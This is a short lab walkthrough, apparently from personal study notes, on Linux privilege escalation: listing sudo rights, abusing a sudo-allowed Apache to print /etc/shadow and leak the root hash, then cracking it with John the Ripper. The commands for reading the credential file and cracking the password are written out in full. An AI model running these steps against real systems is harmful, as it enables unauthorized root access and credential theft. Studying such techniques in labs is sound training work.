
## Detection

**Linux VM**

1. List the programs that can run via sudo:
   ```bash
   sudo -l
   ```

## Exploitation

**Linux VM**

1. Run Apache with the shadow file as the config file:
   ```bash
   sudo apache2 -f /etc/shadow
   ```
2. From the output, copy the root hash.

![[Pasted image 20240905222846.png]]

**Attacker VM**

1. Create a file with the root hash:
   ```bash
   echo 'root:$6$Tb/euwmKVlaXvRDJXET..it8r.jbrlpffzlop1JI0:17298:0:99999:7:::' > hash.txt
   ```

2. Crack the root password:
   ```bash
   john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
   ```

3. Note the cracked credentials.
![[Pasted image 20240905224241.png]]
